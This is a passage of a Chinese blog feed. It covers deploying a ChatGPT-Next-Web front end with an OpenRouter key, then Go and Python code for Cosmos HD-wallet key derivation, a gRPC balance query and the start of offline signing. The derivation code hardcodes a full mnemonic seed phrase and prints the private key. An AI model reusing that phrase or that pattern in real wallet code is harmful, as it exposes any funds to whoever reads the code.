class="headerlink" title="登录"></a>登录</h2><p><img src="/img/pic/login.jpg" alt="登录"></p><h2 id="进入首页"><a href="#进入首页" class="headerlink" title="进入首页"></a>进入首页</h2><p><img src="/img/pic/home.jpg" alt="首页"></p><h2 id="充钱呀"><a href="#充钱呀" class="headerlink" title="充钱呀"></a>充钱呀</h2><h3 id="普通充值-需VISA卡-需要-5-手续费"><a href="#普通充值-需VISA卡-需要-5-手续费" class="headerlink" title="普通充值(需VISA卡,需要+5%手续费)"></a>普通充值(需VISA卡,需要+5%手续费)</h3><p><img src="/img/pic/deposit.jpg" alt="普通充值"></p><h3 id="也支持支持国内银行卡支付，也支持支付宝支付，也有手续费的"><a href="#也支持支持国内银行卡支付，也支持支付宝支付，也有手续费的" class="headerlink" title="也支持支持国内银行卡支付，也支持支付宝支付，也有手续费的"></a>也支持支持国内银行卡支付，也支持支付宝支付，也有手续费的</h3><p><img src="/img/pic/alipay.jpg" alt="普通充值"></p><h3 id="使用ETH充值-首推，同样需要-5-手续费"><a href="#使用ETH充值-首推，同样需要-5-手续费" class="headerlink" title="使用ETH充值(首推，同样需要+5%手续费)"></a>使用ETH充值(首推，同样需要+5%手续费)</h3><p><img src="/img/pic/crypto2.jpg" alt="eth充值"></p><h3 id="创建Api-Key-且保存"><a href="#创建Api-Key-且保存" class="headerlink" title="创建Api Key 且保存"></a>创建Api Key 且保存</h3><p><img src="/img/pic/createkey.jpg" alt="创建key"></p><p>这个平台上面可以直接使用Chatgpt4 但是贵，API便宜好多</p><h1 id="拿到API-Key怎么办？"><a href="#拿到API-Key怎么办？" class="headerlink" title="拿到API Key怎么办？"></a>拿到API Key怎么办？</h1><p><a href="https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web">https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web</a> 一个知名开源前端服务，根据教程部署即可</p><h2 id="vercel一键部署"><a href="#vercel一键部署" class="headerlink" title="vercel一键部署"></a>vercel一键部署</h2><blockquote><p>Vercel 是一个云服务平台，支持静态网站和动态网站的应用部署、预览和上线。如果你用过 GitHub Pages ，那么心里可能不会太陌生，但你也能通过 vercel 集成 GitHub 后，在 GitHub 项目进行代码推送，PR合并自动部署的目的，且你不需要考虑服务器问题。</p></blockquote><p>三个参数必须配置：</p><ul><li>OPENAI_API_KEY&#x3D;你的apikey</li><li>CODE&#x3D;your-password密码必须要,否则容易消耗token</li><li>BASE_URL&#x3D;<a href="https://openrouter.ai/api">https://openrouter.ai/api</a></li></ul><p>Vercel会给你自动分配域名</p><p><img src="/img/pic/createweb1.jpg" alt="创建web"></p><p><img src="/img/pic/createweb.jpg" alt="创建web2"></p><h3 id="docker本地部署（私有）"><a href="#docker本地部署（私有）" class="headerlink" title="docker本地部署（私有）"></a>docker本地部署（私有）</h3><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs docker">docker pull yidadaa/chatgpt-next-web<br><br>docker <span class="hljs-keyword">run</span><span class="language-bash"> -d -p 3000:3000 \</span><br><span class="language-bash">   -e OPENAI_API_KEY=sk-xxxx替换你的apikey \</span><br><span class="language-bash">   -e CODE=your-password密码必须要 \</span><br><span class="language-bash">   -e BASE_URL=https://openrouter.ai/api \</span><br><span class="language-bash">   yidadaa/chatgpt-next-web</span><br> <span class="hljs-comment"># 记住，BASE_URL必须指定换成openrouter.ai的api</span><br> <br> <span class="hljs-comment"># 如果不能联网，则有可能是vpn的原因,可以尝试指定代理端口</span><br> <span class="hljs-comment"># -e PROXY_URL=&quot;http://127.0.0.1:7890&quot;</span><br></code></pre></td></tr></table></figure><h1 id="登录前端页面（手机或者电脑）"><a href="#登录前端页面（手机或者电脑）" class="headerlink" title="登录前端页面（手机或者电脑）"></a>登录前端页面（手机或者电脑）</h1><p>如果是vercel部署，那vercel会给你一个域名</p><p>如果是docker部署，就用对应的端口即可</p><p><img src="/img/pic/login2.jpg" alt="登录"></p><h1 id="切换模型"><a href="#切换模型" class="headerlink" title="切换模型"></a>切换模型</h1><p><img src="/img/pic/charge.jpg" alt="切换模型"></p><h1 id="注意扣费"><a href="#注意扣费" class="headerlink" title="注意扣费"></a>注意扣费</h1><p>使用后可以去openrouter平台看你的花费详情</p><blockquote><p>gpt-4,gpt-4o,gpt-4-Turbo的扣费几乎是gpt-4o-mini,gtp-3Turbo的10倍</p></blockquote><p><img src="/img/pic/activity1.jpg" alt="扣费"></p><p><img src="/img/pic/activity2.jpg" alt="扣费2"></p>]]></content>
    
    
    <categories>
      
      <category>other</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>other</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>07-3 Cosmos 钱包开发流程</title>
    <link href="/2024/06/10/07-3Cosmos%E9%92%B1%E5%8C%85%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/"/>
    <url>/2024/06/10/07-3Cosmos%E9%92%B1%E5%8C%85%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="Cosmos钱包开发"><a href="#Cosmos钱包开发" class="headerlink" title="Cosmos钱包开发"></a>Cosmos钱包开发</h1><p>钱包的交易逻辑都是一样的，</p><ul><li><p>第一步：离线地址生成</p></li><li><p>第二步：构建交易模型</p></li><li><p>第三步：生成一个未签名的msg消息</p></li><li><p>第四步：对msg消息进行签名，返回一个已签名的消息</p></li><li><p>第五步：对已签名的消息希进行广播</p></li></ul><h2 id="离线地址生成"><a href="#离线地址生成" class="headerlink" title="离线地址生成"></a>离线地址生成</h2><p>Cosmos支持两种格式的地址：</p><p>Edd25519和Secp256k1</p><p>以前只支持Secp256k1后来扩展支持Edd25519</p><p>bech32是一种格式</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> hdwallet<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;crypto/sha256&quot;</span><br><span class="hljs-string">&quot;encoding/hex&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;github.com/cosmos/cosmos-sdk/types/bech32&quot;</span><br><span class="hljs-string">&quot;github.com/tyler-smith/go-bip32&quot;</span><br><span class="hljs-string">&quot;github.com/tyler-smith/go-bip39&quot;</span><br><span class="hljs-string">&quot;golang.org/x/crypto/ripemd160&quot;</span><br>)<br><br><span class="hljs-comment">// 生成一个以太坊的钱包</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">cosmosWalletPrivate</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;开始&quot;</span>)<br><span class="hljs-comment">// 首先你可以生成一个随机熵，熵源助记词是BIP-39，</span><br><span class="hljs-comment">//entropy, _ := bip39.NewEntropy(128)</span><br><span class="hljs-comment">//fmt.Println(&quot;entroy:&quot;, entropy)</span><br><span class="hljs-comment">// 通过熵源生成助记词  ==&gt; 注意，不一定要有助记词才有种子，只是助记词方便备份，可以转成种子，你要直接由种子也行，但不好记</span><br><span class="hljs-comment">//mnemonic, _ := bip39.NewMnemonic(entropy)</span><br>mnemonic := <span class="hljs-string">&quot;rural neither robot good glove bracket fee harsh bird iron segment rug&quot;</span><br>fmt.Println(<span class="hljs-string">&quot;mnemonic:&quot;</span>, mnemonic)<br><span class="hljs-comment">// 通过助记词生成种子Seed</span><br>seed := bip39.NewSeed(mnemonic, <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-comment">// password盐值不要加</span><br>fmt.Println(<span class="hljs-string">&quot;seed&quot;</span>, seed)<br><br><span class="hljs-comment">// 接下来就是将种子恢复出主私钥 masterKey 这里进入到了BIP-32了 a</span><br>masterKey, _ := bip32.NewMasterKey(seed)<br><span class="hljs-comment">// 注意，此时还是主私钥，接下来要派生子私钥，派生出来的子私钥才是真正的“私钥”才能对应链的公钥，才能解压缩出地址</span><br>fmt.Println(<span class="hljs-string">&quot;masterKey&quot;</span>, masterKey)<br><br><span class="hljs-comment">// 现在要派生出对应以太坊的子私钥，遵循BIP-44</span><br><span class="hljs-comment">// 接下来进入BIP-44 完成派生,完成对应path参数 m / purpose&#x27; / coin_type&#x27; / account&#x27; / change / address_index</span><br><span class="hljs-comment">// 通过主私钥派生出子私钥,FirstHardenedChild = uint32(0x80000000) 是一个常量，对应强化派生范围</span><br>key, _ := masterKey.NewChildKey(bip32.FirstHardenedChild + <span class="hljs-number">44</span>)   <span class="hljs-comment">// purpose&#x27; ： 44 是固定值，即BIP-44标准，强化派生</span><br>key, _ = key.NewChildKey(bip32.FirstHardenedChild + <span class="hljs-type">uint32</span>(<span class="hljs-number">118</span>)) <span class="hljs-comment">// coin_type&#x27; ：118是cosmos标识&#x27;， 继续强化派生</span><br>key, _ = key.NewChildKey(bip32.FirstHardenedChild + <span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))   <span class="hljs-comment">// account&#x27; : 0 标记账户类型，从0开始，强化派生</span><br>key, _ = key.NewChildKey(<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))                              <span class="hljs-comment">// change :0 外部可见地址， 1 找零地址（外部不可见），通常是 0，普通派生</span><br>key, _ = key.NewChildKey(<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))                              <span class="hljs-comment">// 地址索引 0 1 2 3 这样索引，普通派生</span><br><span class="hljs-comment">// 派生完毕，对应的path 就是 &quot; m/44&#x27;/118&#x27;/0&#x27;/0/0 &quot;</span><br><br><span class="hljs-comment">// 子私钥key 已经出来了，先打印私钥，key.Key就是私钥，注意要转化进制</span><br>cosmosPrivateKey := hex.EncodeToString(key.Key) <span class="hljs-comment">// 编码成字符串 , 这里打印出来的私钥就可以</span><br>fmt.Println(<span class="hljs-string">&quot;privateKey&quot;</span>, cosmosPrivateKey)<br><br>fmt.Println(<span class="hljs-string">&quot;--------------COSMOS在公钥转地址的地方这里会有些不同---------------------&quot;</span>)<br><span class="hljs-comment">// 要对公钥进行 SHA-256处理----&gt; cosmos 的公钥要进行sha256 然后 ripemd哈希</span><br>sha256Hasher := sha256.New()            <span class="hljs-comment">// 相当于在创建sha256这个对象</span><br>sha256Hasher.Write(key.PublicKey().Key) <span class="hljs-comment">// 这里就是在对公钥的字节进行sha256哈希加密</span><br>sha256Hash := sha256Hasher.Sum(<span class="hljs-literal">nil</span>)     <span class="hljs-comment">//</span><br><br><span class="hljs-comment">// 然后对 SHA-256 哈希结果进行 RIPEMD-160 哈希加密处理</span><br>ripemd160Hasher := ripemd160.New()     <span class="hljs-comment">//  同样 创建ripemd-160这个对象</span><br>ripemd160Hasher.Write(sha256Hash)      <span class="hljs-comment">// 这里是在对之前sha256加密后的公钥再进行RIPEMD-160</span><br>pubKeyHash := ripemd160Hasher.Sum(<span class="hljs-literal">nil</span>) <span class="hljs-comment">//</span><br><br><span class="hljs-comment">// Bech32 编码</span><br>bech32Addr, err := bech32.ConvertAndEncode(<span class="hljs-string">&quot;cosmos&quot;</span>, pubKeyHash)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(err)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;cosmosAddress&quot;</span>, bech32Addr)<br><span class="hljs-comment">// 最后把 cosmosPrivateKey 导入到 开普勒钱包 里面去验证下，私钥和地址对上了没</span><br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>Python实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_wallet</span>():<br>    privkey = PrivateKey().serialize()<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;private_key&quot;</span>: privkey,<br>        <span class="hljs-string">&quot;public_key&quot;</span>: privkey_to_pubkey(privkey),<br>        <span class="hljs-string">&quot;address&quot;</span>: privkey_to_address(privkey),<br>    &#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">privkey_to_pubkey</span>(<span class="hljs-params">privkey: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    privkey_obj = PrivateKey(<span class="hljs-built_in">bytes</span>.fromhex(privkey))<br>    <span class="hljs-keyword">return</span> privkey_obj.pubkey.serialize().<span class="hljs-built_in">hex</span>()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pubkey_to_address</span>(<span class="hljs-params">pubkey: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    pubkey_bytes = <span class="hljs-built_in">bytes</span>.fromhex(pubkey)<br>    s = hashlib.new(<span class="hljs-string">&quot;sha256&quot;</span>, pubkey_bytes).digest()<br>    r = hashlib.new(<span class="hljs-string">&quot;ripemd160&quot;</span>, s).digest()<br>    <span class="hljs-keyword">return</span> bech32.bech32_encode(<span class="hljs-string">&quot;cosmos&quot;</span>, bech32.convertbits(r, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">privkey_to_address</span>(<span class="hljs-params">privkey: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    pubkey = privkey_to_pubkey(privkey)<br>    <span class="hljs-keyword">return</span> pubkey_to_address(pubkey)<br><br>wallet = generate_wallet()<br><span class="hljs-built_in">print</span>(wallet)<br></code></pre></td></tr></table></figure><h2 id="离线签名-go编写步骤基于RPC"><a href="#离线签名-go编写步骤基于RPC" class="headerlink" title="离线签名 go编写步骤基于RPC"></a>离线签名 go编写步骤基于RPC</h2><h3 id="0-编写protoBuf-文件"><a href="#0-编写protoBuf-文件" class="headerlink" title="0 编写protoBuf 文件"></a>0 编写protoBuf 文件</h3><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs protobuf">syntax = <span class="hljs-string">&quot;proto3&quot;</span>;<br><br><span class="hljs-keyword">package</span> cosmos;<br><span class="hljs-keyword">option</span> go_package = <span class="hljs-string">&quot;github.com/wangxiaowang01/web3learning/hdwallet/cosmos&quot;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;google/protobuf/empty.proto&quot;</span>;<br><br><span class="hljs-keyword">service </span><span class="hljs-title class_">MyService</span> &#123;<br>  <span class="hljs-function"><span class="hljs-keyword">rpc</span> MyMethod (google.protobuf.Empty) <span class="hljs-keyword">returns</span> (MyResponse) </span>&#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">MyResponse</span> &#123;<br>  <span class="hljs-type">string</span> result = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-将protoBuf转成-pb-go"><a href="#1-将protoBuf转成-pb-go" class="headerlink" title="1 将protoBuf转成 pb.go"></a>1 将protoBuf转成 pb.go</h3><p>或者官方库里面也有pb.go文件</p><h3 id="2-建立连接"><a href="#2-建立连接" class="headerlink" title="2 建立连接"></a>2 建立连接</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// NewClient 新建链接，用于创建一个 grpc 客户端</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewClient</span><span class="hljs-params">()</span></span> (grpcClient *grpc.ClientConn, err <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// gRPC 服务器的地址</span><br>serverAddress := <span class="hljs-string">&quot;cosmos-grpc.publicnode.com:443&quot;</span><br><span class="hljs-keyword">var</span> opts []grpc.DialOption <span class="hljs-comment">// 创建一个空的opts切片，用于存储gRPC客户端连接选项。</span><br><span class="hljs-comment">// 这里的append是奖默认凭证添加到gRPC客户端链接选项中，意味着客户端奖使用默认的凭证进行身份认证</span><br>opts = <span class="hljs-built_in">append</span>(opts, grpc.WithCredentialsBundle(google.NewDefaultCredentials()))<br><br><span class="hljs-comment">// 创建一个gRPC客户端连接，传入服务器地址和这个opts选项，也即是客户端凭证</span><br>grpcConn, err := grpc.NewClient(serverAddress, opts...)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br><span class="hljs-comment">//接下来，代码中创建了一个 typetx.ServiceClient 客户端对象 txClient，用于与服务端的 Service 进行交互。这里的 typetx 可能是根据您的 .proto 文件生成的 Go 代码中的命名空间或包名。</span><br><span class="hljs-comment">// 这里才是最后的创建里一个客户端连接，生成的一个客户端类型</span><br><span class="hljs-comment">//txClient := typetx.NewServiceClient(grpcConn)</span><br><br><span class="hljs-comment">//然后，代码创建了一个 typetx.GetBlockWithTxsRequest 请求对象 req，并设置了其 Height 属性为要查询的块的高度（在这里是 20802601）。</span><br><span class="hljs-comment">//req := &amp;typetx.GetBlockWithTxsRequest&#123;Height: 20802601&#125; // 这里应该是定义一个请求对象，就是说你的请求是什么</span><br><span class="hljs-comment">//rep2 := &amp;typetx.GetHeight&#123;&#125;</span><br><span class="hljs-comment">//最后，代码通过调用 txClient.GetBlockWithTxs() 方法，传入一个 context 对象默认组和请求对象 req，向服务端发送请求并获取响应。响应对象存储在 resp 变量中，错误信息存储在 err 变量中。</span><br><span class="hljs-comment">//resp, err := txClient.GetBlockWithTxs(context.Background(), req) // 这里应该就是发送这个请求对象出去，接收响应</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//panic(err)</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//fmt.Println(resp.Txs[0].Body)</span><br><br>bankClient := banktypes.NewQueryClient(grpcConn)<br>bankReq := &amp;banktypes.QueryBalanceRequest&#123;Address: <span class="hljs-string">&quot;cosmos1sphlm2dp2a4v9hy7fzvqznus26g03vgz006ldt&quot;</span>, Denom: <span class="hljs-string">&quot;uatom&quot;</span>&#125;<br>bankResp, err := bankClient.Balance(context.Background(), bankReq)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;bank str=&quot;</span>, bankResp.String())<br><span class="hljs-keyword">return</span> grpcConn, <span class="hljs-literal">nil</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-组交易广播"><a href="#3-组交易广播" class="headerlink" title="3 组交易广播"></a>3 组交易广播</h3><p>要建立gRPC连接就要编protoBuff 文件转pb.go文件</p><p>要去链上拿用户信息就要建立连接—建立gRPC</p><p>组装交易之前要去链上查到用户信息，获取到Account_number 和 sequence gaslimit 等参数</p><p><strong>先组装交易-</strong>—&gt;<strong>生成一个未签名的交易哈希</strong>—-&gt;<strong>对未签名交易进行私钥签名</strong>—-&gt;<strong>签名后广播出去</strong></p><p><strong>发交易</strong></p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><code class="hljs protobuf"><span class="hljs-keyword">package</span> cosmos<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;context&quot;</span><br><span class="hljs-string">&quot;encoding/hex&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-string">&quot;github.com/cosmos/cosmos-sdk/codec/types&quot;</span><br><span class="hljs-string">&quot;github.com/cosmos/cosmos-sdk/crypto/keys/secp256k1&quot;</span><br>sdk <span class="hljs-string">&quot;github.com/cosmos/cosmos-sdk/types&quot;</span><br>typetx <span class="hljs-string">&quot;github.com/cosmos/cosmos-sdk/types/tx&quot;</span><br><span class="hljs-string">&quot;github.com/cosmos/cosmos-sdk/types/tx/signing&quot;</span><br>authtypes <span class="hljs-string">&quot;github.com/cosmos/cosmos-sdk/x/auth/types&quot;</span><br>banktypes <span class="hljs-string">&quot;github.com/cosmos/cosmos-sdk/x/bank/types&quot;</span><br><span class="hljs-string">&quot;github.com/gogo/protobuf/proto&quot;</span><br>)<br><br><span class="hljs-comment">//func NewGrpcClient() (grpcClient *grpc.ClientConn, err error) &#123;</span><br><span class="hljs-comment">//// 创建grpc连接</span><br><span class="hljs-comment">//target := &quot;cosmos-grpc.publicnode.com:443&quot;</span><br><span class="hljs-comment">//var opts []grpc.DialOption</span><br><span class="hljs-comment">//opts = append(opts, grpc.WithCredentialsBundle(google.NewDefaultCredentials()))</span><br><span class="hljs-comment">//grpcConn, err := grpc.NewClient(target, opts...)</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//panic(err)</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//txClient := typetx.NewServiceClient(grpcConn)</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//req := &amp;typetx.GetBlockWithTxsRequest&#123;Height: 20758858&#125;</span><br><span class="hljs-comment">//resp, err := txClient.GetBlockWithTxs(context.Background(), req)</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//panic(err)</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//fmt.Println(resp.Txs[0].Body)</span><br><span class="hljs-comment">//return grpcConn, nil</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Import 根据十六进制字符串导入私钥。</span><br><span class="hljs-comment">// 参数 privKeyHex 是一个十六进制编码的私钥字符串。</span><br><span class="hljs-comment">// 返回值是一个指向 secp256k1 私钥结构的指针，以及可能的错误。</span><br><span class="hljs-comment">// 该函数的目的是将十六进制表示的私钥转换为 secp256k1 私钥结构，以供后续加密操作使用。</span><br>func Import(privKeyHex <span class="hljs-type">string</span>) (*secp256k1.PrivKey, error) &#123;<br><span 